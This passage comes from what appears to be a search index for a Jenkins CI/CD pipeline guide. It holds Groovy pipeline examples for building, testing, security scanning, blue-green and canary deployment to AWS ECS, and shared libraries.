{\n                            image 'python:3.11-slim'\n                            reuseNode true\n                        }\n                    }\n                    steps {\n                        dir('backend') {\n                            sh 'pip install -q flake8 black mypy'\n                            sh 'flake8 .'\n                            sh 'black --check .'\n                            sh 'mypy .'\n                        }\n                    }\n                }\n            }\n        }\n\n        stage('Build') {\n            parallel {\n                stage('Frontend Build') {\n                    agent {\n                        docker {\n                            image 'node:20-alpine'\n                            reuseNode true\n                        }\n                    }\n                    steps {\n                        dir('frontend') {\n                            sh 'npm ci'\n                            sh 'npm run build'\n                            stash name: 'frontend-dist', includes: 'dist/**'\n                        }\n                    }\n                }\n\n                stage('Backend Build') {\n                    agent {\n                        docker {\n                            image 'python:3.11-slim'\n                            reuseNode true\n                        }\n                    }\n                    steps {\n                        dir('backend') {\n                            sh 'pip install -q build'\n                            sh 'python -m build'\n                            stash name: 'backend-dist', includes: 'dist/**'\n                        }\n                    }\n                }\n            }\n        }\n\n        stage('Test') {\n            parallel {\n                stage('Frontend Unit Tests') {\n                    agent {\n                        docker {\n                            image 'node:20-alpine'\n                            reuseNode true\n                        }\n                    }\n                    steps {\n                        dir('frontend') {\n                            sh 'npm ci'\n                            sh 'npm run test:unit -- --coverage'\n                        }\n                    }\n                    post {\n                        always {\n                            publishHTML([\n                                reportDir: 'frontend/coverage',\n                                reportFiles: 'index.html',\n                                reportName: 'Frontend Coverage Report'\n                            ])\n                        }\n                    }\n                }\n\n                stage('Backend Unit Tests') {\n                    agent {\n                        docker {\n                            image 'python:3.11-slim'\n                            reuseNode true\n                            args '-u root'\n                        }\n                    }\n                    steps {\n                        dir('backend') {\n                            sh '''\n                                pip install -q -e .[test]\n                                pytest tests/unit -v --cov --cov-report=html --cov-report=xml\n                            '''\n                        }\n                    }\n                    post {\n                        always {\n                            publishHTML([\n                                reportDir: 'backend/htmlcov',\n                                reportFiles: 'index.html',\n                                reportName: 'Backend Coverage Report'\n                            ])\n                            cobertura coberturaReportFile: 'backend/coverage.xml'\n                        }\n                    }\n                }\n            }\n        }\n\n        stage('Integration Tests') {\n            agent {\n                docker {\n                    image 'docker:24-dind'\n                    args '-v /var/run/docker.sock:/var/run/docker.sock'\n                }\n            }\n            steps {\n                sh '''\n                    docker-compose -f docker-compose.test.yml up -d\n                    docker-compose -f docker-compose.test.yml run --rm api-tests\n                '''\n            }\n            post {\n                always {\n                    sh 'docker-compose -f docker-compose.test.yml down -v'\n                }\n            }\n        }\n\n        stage('Security Scans') {\n            parallel {\n                stage('Frontend Security') {\n                    agent {\n                        docker {\n                            image 'node:20-alpine'\n                            reuseNode true\n                        }\n                    }\n                    steps {\n                        dir('frontend') {\n                            sh 'npm audit --audit-level=moderate'\n                        }\n                    }\n                }\n\n                stage('Backend Security') {\n                    agent {\n                        docker {\n                            image 'python:3.11-slim'\n                            reuseNode true\n                        }\n                    }\n                    steps {\n                        dir('backend') {\n                            sh '''\n                                pip install -q safety bandit\n                                safety check\n                                bandit -r . -f json -o bandit-report.json || true\n                            '''\n                        }\n                    }\n                    post {\n                        always {\n                            archiveArtifacts artifacts: 'backend/bandit-report.json', allowEmptyArchive: true\n                        }\n                    }\n                }\n\n                stage('Secret Scan') {\n                    agent any\n                    steps {\n                        sh '''\n                            docker run --rm -v $(pwd):/path \\\n                                trufflesecurity/trufflehog:latest \\\n                                filesystem /path --json &gt; trufflehog-report.json || true\n                        '''\n                    }\n                    post {\n                        always {\n                            archiveArtifacts artifacts: 'trufflehog-report.json', allowEmptyArchive: true\n                        }\n                    }\n                }\n            }\n        }\n\n        stage('Build Docker Images') {\n            agent any\n            when {\n                anyOf {\n                    branch 'main'\n                    branch 'develop'\n                }\n            }\n            steps {\n                unstash 'frontend-dist'\n                unstash 'backend-dist'\n\n                sh \"\"\"\n                    echo \\$DOCKER_CREDS_PSW | docker login -u \\$DOCKER_CREDS_USR --password-stdin\n\n                    docker build -t ${DOCKER_REGISTRY}/frontend:${GIT_COMMIT_SHORT} -f frontend/Dockerfile frontend/\n                    docker build -t ${DOCKER_REGISTRY}/backend:${GIT_COMMIT_SHORT} -f backend/Dockerfile backend/\n\n                    docker push ${DOCKER_REGISTRY}/frontend:${GIT_COMMIT_SHORT}\n                    docker push ${DOCKER_REGISTRY}/backend:${GIT_COMMIT_SHORT}\n                \"\"\"\n\n                script {\n                    if (env.BRANCH_NAME == 'main') {\n                        sh \"\"\"\n                            docker tag ${DOCKER_REGISTRY}/frontend:${GIT_COMMIT_SHORT} ${DOCKER_REGISTRY}/frontend:latest\n                            docker tag ${DOCKER_REGISTRY}/backend:${GIT_COMMIT_SHORT} ${DOCKER_REGISTRY}/backend:latest\n\n                            docker push ${DOCKER_REGISTRY}/frontend:latest\n                            docker push ${DOCKER_REGISTRY}/backend:latest\n                        \"\"\"\n                    }\n                }\n            }\n        }\n\n        stage('Deploy to Staging') {\n            agent any\n            when {\n                branch 'develop'\n            }\n            steps {\n                sh \"\"\"\n                    aws configure set aws_access_key_id \\$AWS_CREDS_USR\n                    aws configure set aws_secret_access_key \\$AWS_CREDS_PSW\n                    aws configure set region us-east-1\n\n                    aws ecs update-service \\\\\n                        --cluster staging-cluster \\\\\n                        --service frontend-service \\\\\n                        --force-new-deployment\n\n                    aws ecs update-service \\\\\n                        --cluster staging-cluster \\\\\n                        --service backend-service \\\\\n                        --force-new-deployment\n                \"\"\"\n            }\n        }\n\n        stage('Deploy to Production') {\n            agent any\n            when {\n                branch 'main'\n            }\n            steps {\n                input message: 'Deploy to production?', ok: 'Deploy', submitter: 'ops-team'\n\n                sh \"\"\"\n                    aws configure set aws_access_key_id \\$AWS_CREDS_USR\n                    aws configure set aws_secret_access_key \\$AWS_CREDS_PSW\n                    aws configure set region us-east-1\n\n                    # Blue-green deployment\n                    aws ecs update-service \\\\\n                        --cluster production-cluster \\\\\n                        --service frontend-service-green \\\\\n                        --force-new-deployment\n\n                    aws ecs wait services-stable \\\\\n                        --cluster production-cluster \\\\\n                        --services frontend-service-green\n\n                    # Switch traffic\n                    aws elbv2 modify-listener \\\\\n                        --listener-arn \\$LISTENER_ARN \\\\\n                        --default-actions Type=forward,TargetGroupArn=\\$TARGET_GROUP_GREEN_ARN\n                \"\"\"\n            }\n        }\n\n        stage('Smoke Tests') {\n            agent {\n                docker {\n                    image 'postman/newman:alpine'\n                }\n            }\n            when {\n                anyOf {\n                    branch 'main'\n                    branch 'develop'\n                }\n            }\n            steps {\n                script {\n                    def apiUrl = env.BRANCH_NAME == 'main' ?\n                        'https://api.example.com' :\n                        'https://api-staging.example.com'\n\n                    sh \"\"\"\n                        newman run tests/smoke-tests.postman_collection.json \\\\\n                            --env-var baseUrl=${apiUrl} \\\\\n                            --reporters cli,json \\\\\n                            --reporter-json-export newman-report.json\n                    \"\"\"\n                }\n            }\n            post {\n                always {\n                    archiveArtifacts artifacts: 'newman-report.json', allowEmptyArchive: true\n                }\n            }\n        }\n    }\n\n    post {\n        always {\n            cleanWs()\n        }\n        success {\n            script {\n                if (env.BRANCH_NAME == 'main' || env.BRANCH_NAME == 'develop') {\n                    def msg = \"\u2705 Deployment succeeded: ${env.JOB_NAME} #${env.BUILD_NUMBER}\\n\" +\n                              \"Branch: ${env.BRANCH_NAME}\\nCommit: ${env.GIT_COMMIT_SHORT}\"\n                    slackSend(\n                        channel: env.SLACK_CHANNEL,\n                        color: 'good',\n                        message: msg\n                    )\n                }\n            }\n        }\n        failure {\n            slackSend(\n                channel: env.SLACK_CHANNEL,\n                color: 'danger',\n                message: \"\u274c Build failed: ${env.JOB_NAME} #${env.BUILD_NUMBER}\\nBranch: ${env.BRANCH_NAME}\\n${env.BUILD_URL}\"\n            )\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#deployment-strategies","title":"Deployment Strategies","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#blue-green-deployment","title":"Blue-Green Deployment","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        CLUSTER = 'production-cluster'\n        SERVICE_BLUE = 'myapp-blue'\n        SERVICE_GREEN = 'myapp-green'\n        ALB_LISTENER_ARN = credentials('alb-listener-arn')\n        TARGET_GROUP_BLUE_ARN = credentials('target-group-blue-arn')\n        TARGET_GROUP_GREEN_ARN = credentials('target-group-green-arn')\n    }\n\n    stages {\n        stage('Determine Active Environment') {\n            steps {\n                script {\n                    def currentTarget = sh(\n                        script: \"\"\"\n                            aws elbv2 describe-listeners \\\\\n                                --listener-arns ${ALB_LISTENER_ARN} \\\\\n                                --query 'Listeners[0].DefaultActions[0].TargetGroupArn' \\\\\n                                --output text\n                        \"\"\",\n                        returnStdout: true\n                    ).trim()\n\n                    if (currentTarget == env.TARGET_GROUP_BLUE_ARN) {\n                        env.ACTIVE_ENV = 'blue'\n                        env.INACTIVE_ENV = 'green'\n                        env.INACTIVE_SERVICE = env.SERVICE_GREEN\n                        env.INACTIVE_TARGET_GROUP = env.TARGET_GROUP_GREEN_ARN\n                    } else {\n                        env.ACTIVE_ENV = 'green'\n                        env.INACTIVE_ENV = 'blue'\n                        env.INACTIVE_SERVICE = env.SERVICE_BLUE\n                        env.INACTIVE_TARGET_GROUP = env.TARGET_GROUP_BLUE_ARN\n                    }\n\n                    echo \"Active environment: ${env.ACTIVE_ENV}\"\n                    echo \"Deploying to inactive environment: ${env.INACTIVE_ENV}\"\n                }\n            }\n        }\n\n        stage('Deploy to Inactive Environment') {\n            steps {\n                sh \"\"\"\n                    aws ecs update-service \\\\\n                        --cluster ${CLUSTER} \\\\\n                        --service ${INACTIVE_SERVICE} \\\\\n                        --force-new-deployment \\\\\n                        --task-definition myapp:${env.BUILD_NUMBER}\n                \"\"\"\n            }\n        }\n\n        stage('Wait for Deployment') {\n            steps {\n                sh \"\"\"\n                    aws ecs wait services-stable \\\\\n                        --cluster ${CLUSTER} \\\\\n                        --services ${INACTIVE_SERVICE}\n                \"\"\"\n            }\n        }\n\n        stage('Run Health Checks') {\n            steps {\n                script {\n                    def healthCheckPassed = sh(\n                        script: \"\"\"\n                            for i in {1..10}; do\n                                STATUS=\\$(aws elbv2 describe-target-health \\\\\n                                    --target-group-arn ${INACTIVE_TARGET_GROUP} \\\\\n                                    --query 'TargetHealthDescriptions[0].TargetHealth.State' \\\\\n                                    --output text)\n\n                                if [ \"\\$STATUS\" = \"healthy\" ]; then\n                                    echo \"Health check passed\"\n                                    exit 0\n                                fi\n\n                                echo \"Waiting for healthy status... (attempt \\$i/10)\"\n                                sleep 30\n                            done\n\n                            echo \"Health check failed\"\n                            exit 1\n                        \"\"\",\n                        returnStatus: true\n                    )\n\n                    if (healthCheckPassed != 0) {\n                        error(\"Health checks failed on inactive environment\")\n                    }\n                }\n            }\n        }\n\n        stage('Switch Traffic') {\n            steps {\n                input message: \"Switch traffic to ${env.INACTIVE_ENV} environment?\", ok: 'Switch'\n\n                sh \"\"\"\n                    aws elbv2 modify-listener \\\\\n                        --listener-arn ${ALB_LISTENER_ARN} \\\\\n                        --default-actions Type=forward,TargetGroupArn=${INACTIVE_TARGET_GROUP}\n                \"\"\"\n\n                echo \"Traffic switched to ${env.INACTIVE_ENV} environment\"\n            }\n        }\n\n        stage('Monitor New Environment') {\n            steps {\n                script {\n                    echo \"Monitoring new active environment for 5 minutes...\"\n                    sleep time: 5, unit: 'MINUTES'\n                }\n            }\n        }\n    }\n\n    post {\n        failure {\n            script {\n                echo \"Deployment failed. Rolling back...\"\n\n                // Rollback by switching traffic back to original environment\n                def targetGroup = env.ACTIVE_ENV == 'blue' ? env.TARGET_GROUP_BLUE_ARN : env.TARGET_GROUP_GREEN_ARN\n                sh \"\"\"\n                    aws elbv2 modify-listener \\\\\n                        --listener-arn ${ALB_LISTENER_ARN} \\\\\n                        --default-actions Type=forward,TargetGroupArn=${targetGroup}\n                \"\"\"\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#canary-deployment","title":"Canary Deployment","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        CLUSTER = 'production-cluster'\n        SERVICE_STABLE = 'myapp-stable'\n        SERVICE_CANARY = 'myapp-canary'\n    }\n\n    stages {\n        stage('Deploy Canary') {\n            steps {\n                sh \"\"\"\n                    aws ecs update-service \\\\\n                        --cluster ${CLUSTER} \\\\\n                        --service ${SERVICE_CANARY} \\\\\n                        --force-new-deployment \\\\\n                        --desired-count 1\n                \"\"\"\n            }\n        }\n\n        stage('Canary 10%') {\n            steps {\n                sh \"\"\"\n                    aws elbv2 modify-target-group-attributes \\\\\n                        --target-group-arn ${TARGET_GROUP_CANARY_ARN} \\\\\n                        --attributes Key=deregistration_delay.timeout_seconds,Value=30\n\n                    # Configure 10% traffic to canary\n                    aws elbv2 modify-listener \\\\\n                        --listener-arn ${LISTENER_ARN} \\\\\n                        --default-actions '[\n                            {\n                                \"Type\": \"forward\",\n                                \"ForwardConfig\": {\n                                    \"TargetGroups\": [\n                                        {\"TargetGroupArn\": \"'${TARGET_GROUP_STABLE_ARN}'\", \"Weight\": 90},\n                                        {\"TargetGroupArn\": \"'${TARGET_GROUP_CANARY_ARN}'\", \"Weight\": 10}\n                                    ]\n                                }\n                            }\n                        ]'\n                \"\"\"\n\n                sleep time: 5, unit: 'MINUTES'\n\n                script {\n                    def metrics = checkMetrics()\n                    if (!metrics.healthy) {\n                        error(\"Canary metrics unhealthy at 10%\")\n                    }\n                }\n            }\n        }\n\n        stage('Canary 50%') {\n            steps {\n                input message: 'Proceed to 50% canary?', ok: 'Proceed'\n\n                sh \"\"\"\n                    aws ecs update-service \\\\\n                        --cluster ${CLUSTER} \\\\\n                        --service ${SERVICE_CANARY} \\\\\n                        --desired-count 5\n\n                    aws elbv2 modify-listener \\\\\n                        --listener-arn ${LISTENER_ARN} \\\\\n                        --default-actions '[\n                            {\n                                \"Type\": \"forward\",\n                                \"ForwardConfig\": {\n                                    \"TargetGroups\": [\n                                        {\"TargetGroupArn\": \"'${TARGET_GROUP_STABLE_ARN}'\", \"Weight\": 50},\n                                        {\"TargetGroupArn\": \"'${TARGET_GROUP_CANARY_ARN}'\", \"Weight\": 50}\n                                    ]\n                                }\n                            }\n                        ]'\n                \"\"\"\n\n                sleep time: 10, unit: 'MINUTES'\n\n                script {\n                    def metrics = checkMetrics()\n                    if (!metrics.healthy) {\n                        error(\"Canary metrics unhealthy at 50%\")\n                    }\n                }\n            }\n        }\n\n        stage('Full Rollout') {\n            steps {\n                input message: 'Proceed with full rollout?', ok: 'Deploy'\n\n                sh \"\"\"\n                    # Update stable service with new version\n                    aws ecs update-service \\\\\n                        --cluster ${CLUSTER} \\\\\n                        --service ${SERVICE_STABLE} \\\\\n                        --force-new-deployment\n\n                    aws ecs wait services-stable \\\\\n                        --cluster ${CLUSTER} \\\\\n                        --services ${SERVICE_STABLE}\n\n                    # Switch all traffic to stable\n                    aws elbv2 modify-listener \\\\\n                        --listener-arn ${LISTENER_ARN} \\\\\n                        --default-actions Type=forward,TargetGroupArn=${TARGET_GROUP_STABLE_ARN}\n\n                    # Scale down canary\n                    aws ecs update-service \\\\\n                        --cluster ${CLUSTER} \\\\\n                        --service ${SERVICE_CANARY} \\\\\n                        --desired-count 0\n                \"\"\"\n            }\n        }\n    }\n\n    post {\n        failure {\n            sh \"\"\"\n                # Rollback: remove canary traffic\n                aws elbv2 modify-listener \\\\\n                    --listener-arn ${LISTENER_ARN} \\\\\n                    --default-actions Type=forward,TargetGroupArn=${TARGET_GROUP_STABLE_ARN}\n\n                aws ecs update-service \\\\\n                    --cluster ${CLUSTER} \\\\\n                    --service ${SERVICE_CANARY} \\\\\n                    --desired-count 0\n            \"\"\"\n        }\n    }\n}\n\ndef checkMetrics() {\n    // Check CloudWatch metrics, error rates, latency\n    def errorRate = sh(\n        script: \"\"\"\n            aws cloudwatch get-metric-statistics \\\\\n                --namespace AWS/ApplicationELB \\\\\n                --metric-name HTTPCode_Target_5XX_Count \\\\\n                --dimensions Name=TargetGroup,Value=${TARGET_GROUP_CANARY_ARN} \\\\\n                --start-time \\$(date -u -d '5 minutes ago' +%Y-%m-%dT%H:%M:%S) \\\\\n                --end-time \\$(date -u +%Y-%m-%dT%H:%M:%S) \\\\\n                --period 300 \\\\\n                --statistics Sum \\\\\n                --query 'Datapoints[0].Sum' \\\\\n                --output text\n        \"\"\",\n        returnStdout: true\n    ).trim()\n\n    return [healthy: errorRate.toInteger() &lt; 10]\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#shared-libraries","title":"Shared Libraries","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#creating-a-shared-library","title":"Creating a Shared Library","text":"<p>Directory structure:</p> <pre><code>jenkins-shared-library/\n\u251c\u2500\u2500 vars/\n\u2502   \u251c\u2500\u2500 buildDockerImage.groovy\n\u2502   \u251c\u2500\u2500 deployToK8s.groovy\n\u2502   \u2514\u2500\u2500 notifySlack.groovy\n\u2514\u2500\u2500 src/\n    \u2514\u2500\u2500 com/\n        \u2514\u2500\u2500 mycompany/\n            \u2514\u2500\u2500 jenkins/\n                \u2514\u2500\u2500 Pipeline.groovy\n</code></pre> <p>vars/buildDockerImage.groovy:</p> <pre><code>#!/usr/bin/env groovy\n\ndef call(Map config) {\n    def imageName = config.imageName ?: error(\"imageName is required\")\n    def dockerfile = config.dockerfile ?: 'Dockerfile'\n    def context = config.context ?: '.'\n    def registry = config.registry ?: 'docker.io'\n    def tag = config.tag ?: env.GIT_COMMIT?.take(7) ?: 'latest'\n\n    def fullImageName = \"${registry}/${imageName}:${tag}\"\n\n    echo \"Building Docker image: ${fullImageName}\"\n\n    sh \"\"\"\n        docker build -t ${fullImageName} -f ${dockerfile} ${context}\n    \"\"\"\n\n    if (config.push) {\n        echo \"Pushing Docker image: ${fullImageName}\"\n\n        withCredentials([usernamePassword(\n            credentialsId: config.credentialsId ?: 'docker-hub-credentials',\n            usernameVariable: 'DOCKER_USER',\n            passwordVariable: 'DOCKER_PASS'\n        )]) {\n            sh \"\"\"\n                echo \\$DOCKER_PASS | docker login -u \\$DOCKER_USER --password-stdin ${registry}\n                docker push ${fullImageName}\n            \"\"\"\n        }\n    }\n\n    return fullImageName\n}\n</code></pre> <p>vars/deployToK8s.groovy:</p> <pre><code>#!/usr/bin/env groovy\n\ndef call(Map config) {\n    def namespace = config.namespace ?: error(\"namespace is required\")\n    def deployment = config.deployment ?: error(\"deployment is required\")\n    def image = config.image ?: error(\"image is required\")\n    def container = config.container ?: deployment\n    def kubeconfig = config.kubeconfig ?: 'kubeconfig-production'\n\n    echo \"Deploying ${image} to ${namespace}/${deployment}\"\n\n    withKubeConfig([credentialsId: kubeconfig]) {\n        sh \"\"\"\n            kubectl set image deployment/${deployment} \\\\\n                ${container}=${image} \\\\\n                -n ${namespace}\n\n            kubectl rollout status deployment/${deployment} \\\\\n                -n ${namespace} \\\\\n                --timeout=5m\n        \"\"\"\n    }\n\n    if (config.verify) {\n        echo \"Verifying deployment...\"\n\n        sh \"\"\"\n            kubectl get deployment ${deployment} -n ${namespace}\n            kubectl get pods -n ${namespace} -l app=${deployment}\n        \"\"\"\n    }\n}\n</code></pre> <p>vars/notifySlack.groovy:</p> <pre><code>#!/usr/bin/env groovy\n\ndef call(Map config) {\n    def channel = config.channel ?: '#builds'\n    def message = config.message ?: \"Build ${currentBuild.currentResult}\"\n    def color = config.color ?: getColorByStatus(currentBuild.currentResult)\n\n    def attachments = [[\n        color: color,\n        title: \"${env.JOB_NAME} #${env.BUILD_NUMBER}\",\n        title_link: env.BUILD_URL,\n        text: message,\n        fields: [\n            [title: 'Branch', value: env.BRANCH_NAME ?: 'N/A', short: true],\n            [title: 'Commit', value: env.GIT_COMMIT?.take(7) ?: 'N/A', short: true],\n            [title: 'Status', value: currentBuild.currentResult, short: true],\n            [title: 'Duration', value: currentBuild.durationString, short: true]\n        ],\n        footer: 'Jenkins CI',\n        ts: System.currentTimeMillis() / 1000\n    ]]\n\n    slackSend(\n        channel: channel,\n        attachments: attachments\n    )\n}\n\ndef getColorByStatus(status) {\n    switch(status) {\n        case 'SUCCESS':\n            return 'good'\n        case 'FAILURE':\n            return 'danger'\n        case 'UNSTABLE':\n            return 'warning'\n        default:\n            return '#439FE0'\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#using-shared-library","title":"Using Shared Library","text":"<p>Jenkinsfile:</p> <pre><code>@Library('my-shared-library@main') _\n\npipeline {\n    agent any\n\n    stages {\n        stage('Build Docker Image') {\n            steps {\n                script {\n                    env.DOCKER_IMAGE = buildDockerImage(\n                        imageName: 'myapp',\n                        dockerfile: 'Dockerfile',\n                        registry: 'docker.io/myorg',\n                        tag: env.GIT_COMMIT.take(7),\n                        push: true,\n                        credentialsId: 'docker-hub-credentials'\n                    )\n                }\n            }\n        }\n\n        stage('Deploy to Kubernetes') {\n            steps {\n                script {\n                    deployToK8s(\n                        namespace: 'production',\n                        deployment: 'myapp',\n                        image: env.DOCKER_IMAGE,\n                        container: 'myapp-container',\n                        kubeconfig: 'kubeconfig-production',\n                        verify: true\n                    )\n                }\n            }\n        }\n    }\n\n    post {\n        always {\n            script {\n                notifySlack(\n                    channel: '#deployments',\n                    message: \"Deployment ${currentBuild.currentResult}\"\n                )\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#security-integration","title":"Security Integration","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#sonarqube-integration","title":"SonarQube Integration","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        SONAR_TOKEN = credentials('sonarqube-token')\n    }\n\n    stages {\n        stage('SonarQube Analysis') {\n            steps {\n                script {\n                    def scannerHome = tool 'SonarQubeScanner'\n\n                    withSonarQubeEnv('SonarQube') {\n                        sh \"\"\"\n                            ${scannerHome}/bin/sonar-scanner \\\\\n                                -Dsonar.projectKey=my-project \\\\\n                                -Dsonar.sources=src \\\\\n                                -Dsonar.tests=tests \\\\\n                                -Dsonar.python.coverage.reportPaths=coverage.xml \\\\\n                                -Dsonar.javascript.lcov.reportPaths=coverage/lcov.info\n                        \"\"\"\n                    }\n                }\n            }\n        }\n\n        stage('Quality Gate') {\n            steps {\n                timeout(time: 5, unit: 'MINUTES') {\n                    waitForQualityGate abortPipeline: true\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#snyk-security-scanning","title":"Snyk Security Scanning","text":"<pre><code>pipeline {\n    agent any\n\n    environment {\n        SNYK_TOKEN = credentials('snyk-api-token')\n    }\n\n    stages {\n        stage('Snyk Dependency Scan') {\n            parallel {\n                stage('Snyk - Frontend') {\n                    steps {\n                        dir('frontend') {\n                            sh '''\n                                npm ci\n                                npx snyk test --severity-threshold=high --json &gt; snyk-frontend.json || true\n                                npx snyk monitor\n                            '''\n                        }\n                    }\n                }\n\n                stage('Snyk - Backend') {\n                    steps {\n                        dir('backend') {\n                            sh '''\n                                pip install -r requirements.txt\n                                snyk test --severity-threshold=high --json &gt; snyk-backend.json || true\n                                snyk monitor\n                            '''\n                        }\n                    }\n                }\n\n                stage('Snyk - Docker') {\n                    steps {\n                        sh '''\n                            docker build -t myapp:${GIT_COMMIT} .\n                            snyk container test myapp:${GIT_COMMIT} \\\\\n                                --severity-threshold=high \\\\\n                                --json &gt; snyk-docker.json || true\n                        '''\n                    }\n                }\n            }\n            post {\n                always {\n                    archiveArtifacts artifacts: '**/snyk-*.json', allowEmptyArchive: true\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#trivy-container-scanning","title":"Trivy Container Scanning","text":"<pre><code>stage('Trivy Scan') {\n    steps {\n        sh \"\"\"\n            docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \\\\\n                aquasec/trivy:latest image \\\\\n                --severity HIGH,CRITICAL \\\\\n                --format json \\\\\n                --output trivy-report.json \\\\\n                myapp:${GIT_COMMIT}\n        \"\"\"\n    }\n    post {\n        always {\n            archiveArtifacts artifacts: 'trivy-report.json', allowEmptyArchive: true\n\n            script {\n                def trivyReport = readJSON file: 'trivy-report.json'\n                def criticalCount = trivyReport.Results?.sum {\n                    it.Vulnerabilities?.count { v -&gt; v.Severity == 'CRITICAL' } ?: 0\n                } ?: 0\n\n                if (criticalCount &gt; 0) {\n                    error(\"Found ${criticalCount} CRITICAL vulnerabilities\")\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#testing-strategies","title":"Testing Strategies","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#unit-and-integration-tests","title":"Unit and Integration Tests","text":"<pre><code>stage('Test') {\n    parallel {\n        stage('Backend Tests') {\n            agent {\n                docker {\n                    image 'python:3.11-slim'\n                    reuseNode true\n                }\n            }\n            steps {\n                dir('backend') {\n                    sh '''\n                        pip install -e .[test]\n                        pytest tests/unit -v --junitxml=junit-unit.xml --cov --cov-report=xml\n                        pytest tests/integration -v --junitxml=junit-integration.xml\n                    '''\n                }\n            }\n            post {\n                always {\n                    junit 'backend/junit-*.xml'\n                    cobertura coberturaReportFile: 'backend/coverage.xml'\n                }\n            }\n        }\n\n        stage('Frontend Tests') {\n            agent {\n                docker {\n                    image 'node:20-alpine'\n                    reuseNode true\n                }\n            }\n            steps {\n                dir('frontend') {\n                    sh '''\n                        npm ci\n                        npm run test:unit -- --coverage --reporters=default --reporters=jest-junit\n                    '''\n                }\n            }\n            post {\n                always {\n                    junit 'frontend/junit.xml'\n                    publishHTML([\n                        reportDir: 'frontend/coverage',\n                        reportFiles: 'index.html',\n                        reportName: 'Frontend Coverage'\n                    ])\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#e2e-testing-with-playwright","title":"E2E Testing with Playwright","text":"<pre><code>stage('E2E Tests') {\n    agent {\n        docker {\n            image 'mcr.microsoft.com/playwright:v1.40.0-focal'\n            args '-u root -v /var/run/docker.sock:/var/run/docker.sock'\n        }\n    }\n    steps {\n        sh '''\n            # Start application\n            docker-compose up -d\n\n            # Wait for application to be ready\n            sleep 30\n\n            # Run Playwright tests\n            cd e2e\n            npm ci\n            npx playwright test --reporter=html,junit\n        '''\n    }\n    post {\n        always {\n            sh 'docker-compose down -v'\n            junit 'e2e/test-results/junit.xml'\n            publishHTML([\n                reportDir: 'e2e/playwright-report',\n                reportFiles: 'index.html',\n                reportName: 'Playwright Test Report'\n            ])\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#load-testing-with-k6","title":"Load Testing with k6","text":"<pre><code>stage('Load Testing') {\n    agent {\n        docker {\n            image 'grafana/k6:latest'\n        }\n    }\n    when {\n        branch 'main'\n    }\n    steps {\n        sh '''\n            k6 run --out json=k6-results.json \\\\\n                --vus 100 \\\\\n                --duration 5m \\\\\n                tests/load/api-load-test.js\n        '''\n    }\n    post {\n        always {\n            archiveArtifacts artifacts: 'k6-results.json', allowEmptyArchive: true\n\n            script {\n                def k6Results = readJSON file: 'k6-results.json'\n                def p95 = k6Results.metrics?.http_req_duration?.values?.['p(95)']\n\n                if (p95 &amp;&amp; p95 &gt; 2000) {\n                    unstable(message: \"P95 latency exceeded threshold: ${p95}ms\")\n                }\n            }\n        }\n    }\n}\n</code></pre>","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#performance-optimization","title":"Performance Optimization","text":"","tags":["jenkins","ci-cd","groovy","pipeline","automation","deployment","devops","shared-libraries"]},{"location":"05_ci_cd/jenkins_pipeline_guide/#build-caching","title":"Build Caching","text":"<pre><code>pipeline {\n    agent any\n\n    stages {\n        stage('Build with Cache') {\n            steps {\n                script {\n                    // Use Docker build cache\n                    sh \"\"\"\n                        docker build \\\\\n                            --cache-from ${DOCKER_REGISTRY}/myapp:latest \\\\\n                            --build-arg BUILDKIT_INLINE_CACHE=1 \\\\\n                            -t ${DOCKER_REGISTRY}/myapp:${GIT_COMMIT} \\\\\n                            .\n                    \"\"\"\n                }\n            }\n        }\n\n        stage('npm ci with cache') {\n            agent {\n                docker {\n                    image 'node:20-alpine'\n                    reuseNode true\n                }\n            }\n            steps {\n                dir('frontend') {\n                    // Cache npm dependencies\n                    cache(maxCacheSize: 1000, caches: [\n                        arbitraryFileCache(\n                            path: 'node_modules',\n                            cacheValidityDecidingFile: 'package-lock.json'\n                        )\n                    ]) {\n                        sh 'npm ci'\n                    }\n                }\n            }\n        }\n    